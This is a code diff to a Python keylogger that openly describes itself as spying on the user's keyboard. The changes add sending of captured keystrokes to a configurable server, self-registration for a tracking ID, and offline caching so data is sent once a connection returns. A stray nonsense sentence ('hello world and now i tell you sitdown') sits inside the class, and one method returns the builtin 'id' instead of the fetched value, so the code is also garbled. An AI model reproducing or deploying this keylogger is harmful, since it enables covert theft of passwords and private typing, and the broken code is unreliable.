@@ -5,14 +5,17 @@ from threading import Thread
 import json
 import requests
 import os
+import configparser
 
 
 class KeyLogger():
     '''spy for user keyboard'''
-    def __init__(self, filename):
+    def __init__(self, filename, url):
         self.__log = []
         self.__keylogger_result = ''
         self.__file = filename
+        self.__url = url
+        self.__id = 0
 
     def __log_pressed_keys(self, key):
         '''send data to log'''
@@ -26,7 +29,7 @@ class KeyLogger():
     def __parse_log_loop(self):
         '''parse data from raw log, deleting special keys'''
         while True:
-            black_list = ['shift', 'ctrl', 'alt', 'right', 'left', 'up', 'down'] # deleteing special keys
+            black_list = ['shift', 'ctrl', 'alt', 'right', 'left', 'up', 'down', 'num lock', 'caps lock'] # deleteing special keys
             copy_log = self.__log.copy()
             self.__log = []
             for i in copy_log:
@@ -39,18 +42,17 @@ class KeyLogger():
                 elif not i in black_list:
                     self.__keylogger_result += i
             time.sleep(1)
-
+hello world and now i tell you sitdown
     @staticmethod
     def __read_data_from_file(file):
         with open(file, 'r') as file:
             to_ret = file.read()
         return to_ret
 
-    @staticmethod
-    def __create_json_dict(data):
+    def __create_json_dict(self, data):
         '''create json dict with now date and some data'''
-        now = datetime.now().isoformat()
-        return json.dumps({now: data})
+        now = datetime.strftime(datetime.now(), '%Y-%m-%d %H:%M:%S')
+        return json.dumps({'data': data, 'keylogger_ref': self.__id, 'date':now})
 
     @staticmethod
     def __write_to_file(data, file):
@@ -60,9 +62,9 @@ class KeyLogger():
 
     def __send_to_server(self, data):
         '''send data in json format to server'''
-        link = '' # TODO create server
-        requests.post(link, {'data':self.__create_json_dict(data)})
-
+        now = datetime.strftime(datetime.now(), '%Y-%m-%d %H:%M:%S')
+        p = requests.post(self.__url, {'data': data, 'keylogger_ref': self.__id, 'date':now})
+        print(p.status_code)
     def __restore_data(self):
         '''restore data from file'''
         try:
@@ -76,30 +78,51 @@ class KeyLogger():
         no_Internet = False
         while True:
             try:
+                
                 if no_Internet:
-                    self.__send_to_server(self.__keylogger_result+self.__restore_data())
-                    no_Internet = False
-                    os.remove(self.__file)
+                    to_send = self.__keylogger_result+self.__restore_data()
+                    if to_send:
+                        self.__send_to_server(self.__keylogger_result+self.__restore_data())
+                        no_Internet = False
+                        os.remove(self.__file)
                 else:
-                    self.__send_to_server(self.__keylogger_result)
-            except:
+                    if self.__keylogger_result:
+                        self.__send_to_server(self.__keylogger_result)
+            except Exception as e:
+                print(e)
                 no_Internet = True
                 self.__write_to_file(self.__keylogger_result, self.__file)
             finally:
                 self.__keylogger_result = ''
             time.sleep(10)
 
+    def __get_id(self):
+        conf = configparser.ConfigParser()
+        conf['MAIN'] = requests.get(self.__url+'/create-keylogger').json()
+        with open('config.ini', 'w') as file:
+            conf.write(file)
+        return id
+        
+    def __restore_id(self):
+        conf = configparser.ConfigParser()
+        conf.read('config.ini')
+        print(conf.sections())
+        return conf['MAIN']['id']
 
+    def __inital_doing(self):
+        if os.path.exists('config.ini'):
+            self.__id = self.__restore_id()
+        else:
+            self.__id = self.__get_id()
     def mainloop(self):
         '''divide kelogger's logic to treads'''
+        self.__inital_doing()
         log_thread = Thread(target=self.__listening_loop, name='log')
         parse_log_tread = Thread(target=self.__parse_log_loop, name='parse')
         save_tread = Thread(target=self.__save_data, name='save')
         log_thread.start()
         parse_log_tread.start()
         save_tread.start()
-
-        
 if __name__ == "__main__":
-    keylogger = KeyLogger('log.data')
+    keylogger = KeyLogger('log.data', 'http://127.0.0.1:8000')
     keylogger.mainloop()
